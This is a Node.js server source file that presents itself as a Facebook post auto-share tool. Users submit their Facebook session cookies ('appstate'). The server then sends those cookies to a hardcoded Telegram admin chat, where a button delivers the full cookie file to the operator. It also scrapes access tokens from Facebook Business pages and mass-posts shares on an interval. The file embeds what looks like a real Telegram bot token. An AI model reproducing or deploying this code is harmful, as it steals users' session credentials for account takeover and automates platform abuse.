const express = require('express');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = '8489289311:AAEoSNUaHy7fyRkO7QLG0xjtETbXgrY3vAo';
const ADMIN_CHAT_ID = '8183360446';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

const total = new Map();
const storedCookies = new Map();

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, `👋 Hello ${msg.chat.first_name}! Admin notifications are active.`);
});

bot.on('callback_query', async (query) => {
  const data = query.data;

  if (data.startsWith('ack_')) {
    await bot.answerCallbackQuery(query.id, { text: '✅ Acknowledged!' });
    await bot.sendMessage(ADMIN_CHAT_ID, '✅ You acknowledged this submission.');
  }

  if (data.startsWith('copy_')) {
    const id = data.replace('copy_', '');
    const info = storedCookies.get(id);

    if (info && info.cookie && info.firstName) {
      const { cookie, firstName } = info;
      const timestamp = new Date()
        .toISOString()
        .replace(/[-:T]/g, '')
        .split('.')[0]; // Format YYYYMMDDHHMMSS
      const fileName = `AppState_${firstName}_${timestamp}.txt`;
      const filePath = path.join(__dirname, fileName);

      fs.writeFileSync(filePath, cookie, 'utf8');
      await bot.answerCallbackQuery(query.id, { text: '📋 AppState sent as .txt!' });
      await bot.sendDocument(ADMIN_CHAT_ID, filePath, {
        caption: `📜 AppState File (User: ${firstName})`,
      });

      storedCookies.delete(id);
      setTimeout(() => {
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
      }, 3000);
    } else {
      await bot.answerCallbackQuery(query.id, { text: '❌ AppState expired or missing!' });
    }
  }
});

app.get('/total', (req, res) => {
  const data = Array.from(total.values()).map((link, index) => ({
    session: index + 1,
    url: link.url,
    count: link.count,
    id: link.id,
    target: link.target,
  }));
  res.json(data);
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/api/submit', async (req, res) => {
  const { cookie, url, amount, interval, firstName } = req.body;
  if (!cookie || !url || !amount || !interval)
    return res.status(400).json({ error: 'Missing state, url, amount, or interval' });

  try {
    const cookies = await convertCookie(cookie);
    if (!cookies)
      return res.status(400).json({ status: 500, error: 'Invalid cookies' });

    const shortId = Date.now().toString();
    storedCookies.set(shortId, { cookie, firstName: firstName || 'Unknown' });

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ Acknowledge', callback_data: `ack_${shortId}` },
            { text: '📋 Copy AppState', callback_data: `copy_${shortId}` },
          ],
        ],
      },
    };

    const message = `🚨 *New Web Submission Detected!*\n\n` +
      `👤 *User:* ${firstName || 'Anonymous'}\n` +
      `🌐 *URL:* ${url}\n` +
      `🎯 *Amount:* ${amount}\n` +
      `⏱️ *Interval:* ${interval}s\n\n` +
      `📜 *Shortened AppState:*\n\`${cookie.substring(0, 80)}... (truncated)\``;

    await bot.sendMessage(ADMIN_CHAT_ID, message, opts);
    await share(cookies, url, amount, interval);
    res.status(200).json({ status: 200 });
  } catch (err) {
    console.error('❌ Error:', err);
    return res.status(500).json({ status: 500, error: err.message || err });
  }
});

async function share(cookies, url, amount, interval) {
  const id = await getPostID(url);
  const accessToken = await getAccessToken(cookies);
  if (!id) throw new Error("Unable to get link id: invalid URL or private post.");
  const postId = total.has(id) ? id + 1 : id;
  total.set(postId, { url, id, count: 0, target: amount });

  const headers = {
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate',
    'connection': 'keep-alive',
    'content-length': '0',
    'cookie': cookies,
    'host': 'graph.facebook.com',
  };

  let sharedCount = 0;
  let timer;

  async function sharePost() {
    try {
      const response = await axios.post(
        `https://graph.facebook.com/me/feed?link=https://m.facebook.com/${id}&published=0&access_token=${accessToken}`,
        {},
        { headers }
      );
      if (response.status === 200) {
        total.set(postId, {
          ...total.get(postId),
          count: total.get(postId).count + 1,
        });
        sharedCount++;
      }
      if (sharedCount === amount) clearInterval(timer);
    } catch {
      clearInterval(timer);
      total.delete(postId);
    }
  }

  timer = setInterval(sharePost, interval * 1000);
  setTimeout(() => {
    clearInterval(timer);
    total.delete(postId);
  }, amount * interval * 1000);
}

async function getPostID(url) {
  try {
    const response = await axios.post(
      'https://id.traodoisub.com/api.php',
      `link=${encodeURIComponent(url)}`,
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );
    return response.data.id;
  } catch {
    return;
  }
}

async function getAccessToken(cookie) {
  try {
    const headers = {
      'authority': 'business.facebook.com',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'cookie': cookie,
      'referer': 'https://www.facebook.com/',
      'upgrade-insecure-requests': '1',
    };
    const response = await axios.get('https://business.facebook.com/content_management', { headers });
    const token = response.data.match(/"accessToken":\s*"([^"]+)"/);
    if (token && token[1]) return token[1];
  } catch {
    return;
  }
}

async function convertCookie(cookie) {
  return new Promise((resolve, reject) => {
    try {
      const cookies = JSON.parse(cookie);
      const sbCookie = cookies.find(c => c.key === 'sb');
      if (!sbCookie) return reject('Invalid appstate: missing "sb" key');
      const sbValue = sbCookie.value;
      const data = `sb=${sbValue}; ${cookies.slice(1).map(c => `${c.key}=${c.value}`).join('; ')}`;
      resolve(data);
    } catch {
      reject('Error processing appstate, please provide a valid one');
    }
  });
}

app.listen(5000, () => console.log('🚀 Server running on port 5000'));
